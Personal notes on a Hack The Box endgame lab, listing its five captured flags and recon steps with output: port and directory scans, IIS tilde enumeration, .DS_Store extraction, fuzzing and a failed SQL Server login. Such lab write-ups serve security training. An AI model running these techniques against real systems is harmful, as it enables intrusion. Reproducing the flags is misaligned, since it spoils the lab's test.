@ https://www.hackthebox.eu/home/endgame/view/1

Recon POO{fcfb0767f5bd3cbc22f40ff5011ad555}
Huh?! POO{88d829eb39f2d11697e689d779810d42}
BackTrack POO{4882bd2ccfd4b5318978540d9843729f}
Foothold POO{ff87c4fe10e2ef096f9a96a01c646f8f}
p00ned POO{1196ef8bc523f084ad1732a38a0851d6}

$ nmap -sC -sV -Pn 10.13.38.11
Nmap scan report for 10.13.38.11
Host is up (0.17s latency).
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Professional Offensive Operations
1433/tcp open  ms-sql-s Microsoft SQL Server 14.00.1000.00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| ms-sql-info:
|   10.13.38.11:1433:
|     Version:
|       Product: Microsoft SQL Server
|       number: 14.00.1000.00
|       name: Microsoft SQL Server
|_    TCP port: 1433

$ gobuster -w directory-list-2.3-medium.txt -u http://10.13.38.11 2>/dev/null
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.13.38.11
[+] Threads      : 10
[+] Wordlist     : directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
/images (Status: 301)
/templates (Status: 301)
/themes (Status: 301)
/uploads (Status: 301)
/plugins (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/widgets (Status: 301)
/meta-inf (Status: 301)

@ https://github.com/irsdl/IIS-ShortName-Scanner
# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2018/12/29 16:18:13
Target: http://10.13.38.11
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): \a.aspx
|_ Extra information:
	|_ Number of sent requests: 615
	|_ Identified directories: 5
		|_ DS_STO~1
		|_ NEWFOL~1
		|_ NEWFOL~2
		|_ TEMPLA~1
		|_ TRASHE~1
	|_ Indentified files: 1
		|_ WEB~1.CON
			|_ Actual file name = WEB
@ https://webbreacher.com/2014/10/23/tilde-enumeration
$ curl -XOPTIONS -sL "http://10.13.38.11/WEB~1.CON" -o /dev/null -w "%{http_code}"
404
@ https://serverfault.com/questions/670658/fixing-the-iis-tilde-vulnerability/672317#answer-672317
> fsutil 8dot3name scan /s /v E:\inetpub\wwwroot
> fsutil 8dot3name strip /s /v E:\inetpub\wwwroot
config.xml:
<entry> key="magicFinalPartList">
	<![CDATA[\a.aspx,\a.asp,/a.aspx,/a.asp,/a.shtml,/a.asmx‌​,/a.ashx,/a.config,/a.php,/a.jpg,/webresource.axd,,/a.xxx]]>
</entry>
$ gobuster -w /SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://10.13.38.11 -x asp,aspx,asm,asmx -t 200
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.13.38.11/
[+] Threads      : 200
[+] Wordlist     : ../SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : asp,aspx,asm,asmx
[+] Timeout      : 10s
=====================================================
/images (Status: 301)
/uploads (Status: 301)
/plugins (Status: 301)
/themes (Status: 301)
/templates (Status: 301)
/js (Status: 301)
/dev (Status: 301)
/widgets (Status: 301)
/meta-inf (Status: 301)
/. (Status: 200)
/.ds_store (Status: 200)

[py] ds_store
@ https://github.com/lijiejie/ds_store_exp
$ python -u ds_store_exp.py http://10.13.38.11/.DS_Store
/10.13.38.11
├── dev
│   ├── 304c0c90fbc6520610abbf378e2339d1 (mrb3n)
│   │   └── DS_Store (core db include src)
│   ├── dca66d38fd916317687e1390a420c3fc (eks)
│   │   └── DS_Store (core db include src)
│   └── DS_Store
├── DS_Store (admin META-INF "New folder" "New folder (2)" Plugins Templates Uploads web.config)
├── iisstart.htm
├── Images
│   ├── DS_Store (buttons icons)
│   └── iisstart.png
├── JS
│   └── DS_Store (custom)
├── Themes
│   └── DS_Store (default)
└── Widgets
    ├── DS_Store (CalendarEvents Menu Notifications)
    └── Framework
        ├── DS_Store
        └── Layouts
            └── DS_Store (custom default)
/Python-dsstore$ python -u main.py /ds_store_exp/10.13.38.11/DS_Store | sort | uniq
admin
dev
iisstart.htm
Images
JS
META-INF
New folder
New folder (2)
Plugins
Templates
Themes
Uploads
web.config
Widgets
@ https://0day.work/parsing-the-ds_store-file-format
@ https://apple.stackexchange.com/questions/240016/examine-a-ds-store-file
@ https://github.com/al45tair/ds_store
@ https://github.com/gehaxelt/ds_store
@ https://github.com/gehaxelt/Python-dsstore

$ while read u; do wfuzz -c -z file,wordlist/general/common.txt --sc 200 "${u}/FUZZ.txt"; done <url.txt
http://10.13.38.11
http://10.13.38.11/admin
http://10.13.38.11/dev
http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
http://10.13.38.11/Images
http://10.13.38.11/Images/buttons
http://10.13.38.11/Images/icons
http://10.13.38.11/JS
http://10.13.38.11/JS/custom
http://10.13.38.11/META-INF
http://10.13.38.11/New%20folder
http://10.13.38.11/New%20folder%20%282%29
http://10.13.38.11/Plugins
http://10.13.38.11/Templates
http://10.13.38.11/Themes
http://10.13.38.11/Themes/default
http://10.13.38.11/Uploads
http://10.13.38.11/Widgets
http://10.13.38.11/Widgets/CalendarEvents
http://10.13.38.11/Widgets/Framework
http://10.13.38.11/Widgets/Framework/Layouts
http://10.13.38.11/Widgets/Framework/Layouts/custom
http://10.13.38.11/Widgets/Framework/Layouts/default
http://10.13.38.11/Widgets/Menu
http://10.13.38.11/Widgets/Notifications

$ sudo apt-get -y install freetds-bin
$ tsql -S 10.13.38.11 -U mrb3n -P eks
locale is "en_US.UTF-8"
locale charset is "UTF-8"
using default charset "UTF-8"
Msg 18456 (severity 14, state 1) from COMPATIBILITY\POO_PUBLIC Line 1:
	"Login failed for user 'mrb3n'."
Error 20002 (severity 9):
	Adaptive Server connection failed
There was a problem connecting to the server

---
@ https://medium.com/secjuice/hackthebox-mantis-writeup-9c2b50c4b30b
@ https://medium.com/pentestsec/hackthebox-tally-ctf-writeup-e132354d60e1
@ https://raw.githubusercontent.com/Alamot/code-snippets/master/mssql/mssql_shell.py
@ https://forum.hackthebox.eu/discussion/723/tally-write-up-by-alamot
	SharePointURLBrute v1.1 @ https://www.bishopfox.com/download/414
